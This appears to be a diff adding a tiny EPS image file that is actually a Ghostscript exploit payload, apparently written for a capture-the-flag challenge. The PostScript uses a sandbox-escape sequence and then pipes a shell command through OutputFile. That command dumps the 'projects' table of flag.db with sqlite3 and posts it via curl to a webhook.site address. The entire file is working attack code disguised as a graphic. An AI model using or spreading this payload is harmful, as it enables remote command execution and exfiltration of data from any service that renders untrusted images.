@@ -1,0 +1,11 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: -0 -0 100 100
+
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%curl -X POST https://webhook.site/15c2cd1e-4dcf-4fa4-b54d-492b69d93ac2 -d "`sqlite3 flag.db "select * from projects;"`") currentdevice putdeviceprops
+showpage
